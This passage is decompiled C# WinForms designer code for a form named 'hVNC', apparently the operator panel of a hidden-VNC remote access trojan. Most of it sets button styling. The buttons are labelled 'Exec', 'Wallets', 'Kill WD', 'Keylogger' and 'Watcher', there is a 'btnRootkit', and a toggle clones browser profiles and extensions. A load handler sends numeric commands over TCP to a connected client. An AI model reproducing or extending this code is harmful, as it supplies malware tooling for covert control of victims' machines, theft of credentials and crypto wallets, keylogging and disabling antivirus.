            bloom83.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom84.Name = "Shine2A";
            bloom84.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom85.Name = "Shine2B";
            bloom85.Value = System.Drawing.Color.Transparent;
            bloom86.Name = "Shine3";
            bloom86.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom87.Name = "TextShade";
            bloom87.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom88.Name = "Text";
            bloom88.Value = System.Drawing.Color.White;
            bloom89.Name = "Glow";
            bloom89.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom90.Name = "Border";
            bloom90.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom91.Name = "Corners";
            bloom91.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton1.Colors = new Bloom[13]
            {
                bloom79, bloom80, bloom81, bloom82, bloom83, bloom84, bloom85, bloom86, bloom87, bloom88,
                bloom89, bloom90, bloom91
            };
            this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton1.Image = null;
            this.studioButton1.Location = new System.Drawing.Point(8, 178);
            this.studioButton1.Name = "studioButton1";
            this.studioButton1.NoRounding = false;
            this.studioButton1.Size = new System.Drawing.Size(94, 25);
            this.studioButton1.TabIndex = 64;
            this.studioButton1.Text = "Exec";
            this.studioButton1.Transparent = true;
            this.studioButton1.Click += new System.EventHandler(studioButton1_Click);
            this.studioButton6.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton6.BackColor = System.Drawing.Color.Transparent;
            bloom92.Name = "DownGradient1";
            bloom92.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom93.Name = "DownGradient2";
            bloom93.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom94.Name = "NoneGradient1";
            bloom94.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom95.Name = "NoneGradient2";
            bloom95.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom96.Name = "Shine1";
            bloom96.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom97.Name = "Shine2A";
            bloom97.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom98.Name = "Shine2B";
            bloom98.Value = System.Drawing.Color.Transparent;
            bloom99.Name = "Shine3";
            bloom99.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom100.Name = "TextShade";
            bloom100.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom101.Name = "Text";
            bloom101.Value = System.Drawing.Color.White;
            bloom102.Name = "Glow";
            bloom102.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom103.Name = "Border";
            bloom103.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom104.Name = "Corners";
            bloom104.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton6.Colors = new Bloom[13]
            {
                bloom92, bloom93, bloom94, bloom95, bloom96, bloom97, bloom98, bloom99, bloom100, bloom101,
                bloom102, bloom103, bloom104
            };
            this.studioButton6.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.studioButton6.Image = null;
            this.studioButton6.Location = new System.Drawing.Point(8, 374);
            this.studioButton6.Name = "studioButton6";
            this.studioButton6.NoRounding = false;
            this.studioButton6.Size = new System.Drawing.Size(94, 25);
            this.studioButton6.TabIndex = 74;
            this.studioButton6.Text = "Wallets";
            this.studioButton6.Transparent = true;
            this.studioButton6.Click += new System.EventHandler(studioButton6_Click);
            this.chkClone.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkClone.BackColor = System.Drawing.Color.Transparent;
            this.chkClone.Checked = true;
            this.chkClone.Location = new System.Drawing.Point(30, 695);
            this.chkClone.Name = "chkClone";
            this.chkClone.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkClone.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkClone.Size = new System.Drawing.Size(50, 19);
            this.chkClone.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkClone.TabIndex = 65;
            this.toolTip1.SetToolTip(this.chkClone, "Clone Profile and Browser Extensions!");
            this.btnWatcher.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnWatcher.BackColor = System.Drawing.Color.Transparent;
            bloom105.Name = "DownGradient1";
            bloom105.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom106.Name = "DownGradient2";
            bloom106.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom107.Name = "NoneGradient1";
            bloom107.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom108.Name = "NoneGradient2";
            bloom108.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom109.Name = "Shine1";
            bloom109.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom110.Name = "Shine2A";
            bloom110.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom111.Name = "Shine2B";
            bloom111.Value = System.Drawing.Color.Transparent;
            bloom112.Name = "Shine3";
            bloom112.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom113.Name = "TextShade";
            bloom113.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom114.Name = "Text";
            bloom114.Value = System.Drawing.Color.White;
            bloom115.Name = "Glow";
            bloom115.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom116.Name = "Border";
            bloom116.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom117.Name = "Corners";
            bloom117.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnWatcher.Colors = new Bloom[13]
            {
                bloom105, bloom106, bloom107, bloom108, bloom109, bloom110, bloom111, bloom112, bloom113, bloom114,
                bloom115, bloom116, bloom117
            };
            this.btnWatcher.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnWatcher.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.btnWatcher.Image = null;
            this.btnWatcher.Location = new System.Drawing.Point(8, 211);
            this.btnWatcher.Name = "btnWatcher";
            this.btnWatcher.NoRounding = false;
            this.btnWatcher.Size = new System.Drawing.Size(94, 25);
            this.btnWatcher.TabIndex = 70;
            this.btnWatcher.Text = "Watcher";
            this.btnWatcher.Transparent = true;
            this.btnWatcher.Click += new System.EventHandler(btnWatcher_Click);
            this.btnElectrum.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnElectrum.BackColor = System.Drawing.Color.Transparent;
            bloom118.Name = "DownGradient1";
            bloom118.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom119.Name = "DownGradient2";
            bloom119.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom120.Name = "NoneGradient1";
            bloom120.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom121.Name = "NoneGradient2";
            bloom121.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom122.Name = "Shine1";
            bloom122.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom123.Name = "Shine2A";
            bloom123.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom124.Name = "Shine2B";
            bloom124.Value = System.Drawing.Color.Transparent;
            bloom125.Name = "Shine3";
            bloom125.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom126.Name = "TextShade";
            bloom126.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom127.Name = "Text";
            bloom127.Value = System.Drawing.Color.White;
            bloom128.Name = "Glow";
            bloom128.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom129.Name = "Border";
            bloom129.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom130.Name = "Corners";
            bloom130.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnElectrum.Colors = new Bloom[13]
            {
                bloom118, bloom119, bloom120, bloom121, bloom122, bloom123, bloom124, bloom125, bloom126, bloom127,
                bloom128, bloom129, bloom130
            };
            this.btnElectrum.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnElectrum.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.btnElectrum.Image = null;
            this.btnElectrum.Location = new System.Drawing.Point(8, 244);
            this.btnElectrum.Name = "btnElectrum";
            this.btnElectrum.NoRounding = false;
            this.btnElectrum.Size = new System.Drawing.Size(94, 25);
            this.btnElectrum.TabIndex = 72;
            this.btnElectrum.Text = "Kill WD";
            this.btnElectrum.Transparent = true;
            this.btnElectrum.Click += new System.EventHandler(studioButton2_Click);
            this.btnRootkit.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnRootkit.BackColor = System.Drawing.Color.Transparent;
            bloom131.Name = "DownGradient1";
            bloom131.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom132.Name = "DownGradient2";
            bloom132.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom133.Name = "NoneGradient1";
            bloom133.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom134.Name = "NoneGradient2";
            bloom134.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom135.Name = "Shine1";
            bloom135.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom136.Name = "Shine2A";
            bloom136.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom137.Name = "Shine2B";
            bloom137.Value = System.Drawing.Color.Transparent;
            bloom138.Name = "Shine3";
            bloom138.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom139.Name = "TextShade";
            bloom139.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom140.Name = "Text";
            bloom140.Value = System.Drawing.Color.White;
            bloom141.Name = "Glow";
            bloom141.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom142.Name = "Border";
            bloom142.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom143.Name = "Corners";
            bloom143.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnRootkit.Colors = new Bloom[13]
            {
                bloom131, bloom132, bloom133, bloom134, bloom135, bloom136, bloom137, bloom138, bloom139, bloom140,
                bloom141, bloom142, bloom143
            };
            this.btnRootkit.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnRootkit.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.btnRootkit.Image = null;
            this.btnRootkit.Location = new System.Drawing.Point(8, 46);
            this.btnRootkit.Name = "btnRootkit";
            this.btnRootkit.NoRounding = false;
            this.btnRootkit.Size = new System.Drawing.Size(94, 25);
            this.btnRootkit.TabIndex = 71;
            this.btnRootkit.Text = "Apps";
            this.toolTip1.SetToolTip(this.btnRootkit, "      All fuctions");
            this.btnRootkit.Transparent = true;
            this.btnRootkit.Click += new System.EventHandler(btnRootkit_Click);
            this.btnKeyl.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnKeyl.BackColor = System.Drawing.Color.Transparent;
            bloom144.Name = "DownGradient1";
            bloom144.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom145.Name = "DownGradient2";
            bloom145.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom146.Name = "NoneGradient1";
            bloom146.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom147.Name = "NoneGradient2";
            bloom147.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom148.Name = "Shine1";
            bloom148.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom149.Name = "Shine2A";
            bloom149.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom150.Name = "Shine2B";
            bloom150.Value = System.Drawing.Color.Transparent;
            bloom151.Name = "Shine3";
            bloom151.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom152.Name = "TextShade";
            bloom152.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom153.Name = "Text";
            bloom153.Value = System.Drawing.Color.White;
            bloom154.Name = "Glow";
            bloom154.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom155.Name = "Border";
            bloom155.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom156.Name = "Corners";
            bloom156.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnKeyl.Colors = new Bloom[13]
            {
                bloom144, bloom145, bloom146, bloom147, bloom148, bloom149, bloom150, bloom151, bloom152, bloom153,
                bloom154, bloom155, bloom156
            };
            this.btnKeyl.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnKeyl.Font = new System.Drawing.Font("Verdana", 8f);
            this.btnKeyl.Image = null;
            this.btnKeyl.Location = new System.Drawing.Point(8, 343);
            this.btnKeyl.Name = "btnKeyl";
            this.btnKeyl.NoRounding = false;
            this.btnKeyl.Size = new System.Drawing.Size(94, 25);
            this.btnKeyl.TabIndex = 87;
            this.btnKeyl.Text = "Keylogger";
            this.btnKeyl.Transparent = true;
            this.btnKeyl.Visible = false;
            this.btnKeyl.Click += new System.EventHandler(btnKeyl_Click);
            this.studioButton2.BackColor = System.Drawing.Color.Transparent;
            bloom157.Name = "DownGradient1";
            bloom157.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom158.Name = "DownGradient2";
            bloom158.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom159.Name = "NoneGradient1";
            bloom159.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom160.Name = "NoneGradient2";
            bloom160.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom161.Name = "Shine1";
            bloom161.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom162.Name = "Shine2A";
            bloom162.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom163.Name = "Shine2B";
            bloom163.Value = System.Drawing.Color.Transparent;
            bloom164.Name = "Shine3";
            bloom164.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom165.Name = "TextShade";
            bloom165.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom166.Name = "Text";
            bloom166.Value = System.Drawing.Color.White;
            bloom167.Name = "Glow";
            bloom167.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom168.Name = "Border";
            bloom168.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom169.Name = "Corners";
            bloom169.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton2.Colors = new Bloom[13]
            {
                bloom157, bloom158, bloom159, bloom160, bloom161, bloom162, bloom163, bloom164, bloom165, bloom166,
                bloom167, bloom168, bloom169
            };
            this.studioButton2.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton2.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton2.Image = null;
            this.studioButton2.Location = new System.Drawing.Point(1122, 39);
            this.studioButton2.Name = "studioButton2";
            this.studioButton2.NoRounding = false;
            this.studioButton2.Size = new System.Drawing.Size(13, 30);
            this.studioButton2.TabIndex = 73;
            this.studioButton2.Transparent = true;
            this.studioButton2.Click += new System.EventHandler(studioButton2_Click_1);
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom170.Name = "DownGradient1";
            bloom170.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom171.Name = "DownGradient2";
            bloom171.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom172.Name = "NoneGradient1";
            bloom172.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom173.Name = "NoneGradient2";
            bloom173.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom174.Name = "Shine1";
            bloom174.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom175.Name = "Shine2A";
            bloom175.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom176.Name = "Shine2B";
            bloom176.Value = System.Drawing.Color.Transparent;
            bloom177.Name = "Shine3";
            bloom177.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom178.Name = "TextShade";
            bloom178.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom179.Name = "Text";
            bloom179.Value = System.Drawing.Color.White;
            bloom180.Name = "Glow";
            bloom180.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom181.Name = "Border";
            bloom181.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom182.Name = "Corners";
            bloom182.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton5.Colors = new Bloom[13]
            {
                bloom170, bloom171, bloom172, bloom173, bloom174, bloom175, bloom176, bloom177, bloom178, bloom179,
                bloom180, bloom181, bloom182
            };
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(1182, 39);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 39;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
            this.studioButton4.BackColor = System.Drawing.Color.Transparent;
            bloom183.Name = "DownGradient1";
            bloom183.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom184.Name = "DownGradient2";
            bloom184.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom185.Name = "NoneGradient1";
            bloom185.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom186.Name = "NoneGradient2";
            bloom186.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom187.Name = "Shine1";
            bloom187.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom188.Name = "Shine2A";
            bloom188.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom189.Name = "Shine2B";
            bloom189.Value = System.Drawing.Color.Transparent;
            bloom190.Name = "Shine3";
            bloom190.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom191.Name = "TextShade";
            bloom191.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom192.Name = "Text";
            bloom192.Value = System.Drawing.Color.White;
            bloom193.Name = "Glow";
            bloom193.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom194.Name = "Border";
            bloom194.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom195.Name = "Corners";
            bloom195.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton4.Colors = new Bloom[13]
            {
                bloom183, bloom184, bloom185, bloom186, bloom187, bloom188, bloom189, bloom190, bloom191, bloom192,
                bloom193, bloom194, bloom195
            };
            this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton4.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton4.Image = null;
            this.studioButton4.Location = new System.Drawing.Point(1162, 39);
            this.studioButton4.Name = "studioButton4";
            this.studioButton4.NoRounding = false;
            this.studioButton4.Size = new System.Drawing.Size(13, 30);
            this.studioButton4.TabIndex = 38;
            this.studioButton4.Transparent = true;
            this.studioButton4.Click += new System.EventHandler(studioButton4_Click);
            this.studioButton3.BackColor = System.Drawing.Color.Transparent;
            bloom196.Name = "DownGradient1";
            bloom196.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom197.Name = "DownGradient2";
            bloom197.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom198.Name = "NoneGradient1";
            bloom198.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom199.Name = "NoneGradient2";
            bloom199.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom200.Name = "Shine1";
            bloom200.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom201.Name = "Shine2A";
            bloom201.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom202.Name = "Shine2B";
            bloom202.Value = System.Drawing.Color.Transparent;
            bloom203.Name = "Shine3";
            bloom203.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom204.Name = "TextShade";
            bloom204.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom205.Name = "Text";
            bloom205.Value = System.Drawing.Color.White;
            bloom206.Name = "Glow";
            bloom206.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom207.Name = "Border";
            bloom207.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom208.Name = "Corners";
            bloom208.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton3.Colors = new Bloom[13]
            {
                bloom196, bloom197, bloom198, bloom199, bloom200, bloom201, bloom202, bloom203, bloom204, bloom205,
                bloom206, bloom207, bloom208
            };
            this.studioButton3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton3.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton3.Image = null;
            this.studioButton3.Location = new System.Drawing.Point(1142, 39);
            this.studioButton3.Name = "studioButton3";
            this.studioButton3.NoRounding = false;
            this.studioButton3.Size = new System.Drawing.Size(13, 30);
            this.studioButton3.TabIndex = 37;
            this.studioButton3.Transparent = true;
            this.studioButton3.Click += new System.EventHandler(studioButton3_Click);
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            base.ClientSize = new System.Drawing.Size(1254, 763);
            base.Controls.Add(this.tabControl1);
            base.Controls.Add(this.panel1);
            base.Controls.Add(this.txtScreen);
            base.Controls.Add(this.studioButton2);
            base.Controls.Add(this.studioButton5);
            base.Controls.Add(this.studioButton4);
            base.Controls.Add(this.studioButton3);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
            base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.MinimizeBox = false;
            base.Name = "hVNC";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            base.TransparencyKey = System.Drawing.Color.Fuchsia;
            base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
            base.Load += new System.EventHandler(VNCForm_Load);
            base.Click += new System.EventHandler(VNCForm_Click);
            base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(VNCForm_KeyPress);
            this.contextMenuStrip1.ResumeLayout(false);
            this.contextMenuStrip2.ResumeLayout(false);
            this.contextMenuStrip3.ResumeLayout(false);
            this.contextMenuStrip4.ResumeLayout(false);
            this.contextMenuStrip5.ResumeLayout(false);
            this.contextMenuStrip6.ResumeLayout(false);
            this.contextMenuStrip7.ResumeLayout(false);
            this.FileManagerContextMenuStrip.ResumeLayout(false);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.VNCBox).EndInit();
            this.groupBox6.ResumeLayout(false);
            this.groupBox6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.IntervalScroll).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.QualityScroll).EndInit();
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.ResizeScroll).EndInit();
            this.tabControl1.ResumeLayout(false);
            this.tabPage6.ResumeLayout(false);
            this.tabPage7.ResumeLayout(false);
            this.tabPage7.PerformLayout();
            this.tabPage8.ResumeLayout(false);
            this.tabPage9.ResumeLayout(false);
            this.tabPage10.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox42).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox43).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox44).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox46).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox37).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox38).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox39).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox40).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox41).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox1).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox2).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox3).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox4).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox5).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox7).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox6).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox8).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox11).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox32).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox10).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox33).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox9).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox34).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox12).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox35).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox13).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox36).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox14).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox15).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox16).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox17).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox18).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox19).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox20).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox21).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox22).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox23).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox24).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox25).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox26).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox27).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox28).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox29).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox30).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox31).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        [CompilerGenerated]
        private void _VNCForm_Load_b__29_0()
        {
            SendTCP("0*", tcpClient_0);
            SendTCP("18*" + Convert.ToString("100"), tcpClient_0);
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
            SendTCP("2068*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            SendTCP("2075*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            SendTCP("2076*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            SendTCP("2083", tcpClient_0);
        }
    }
}
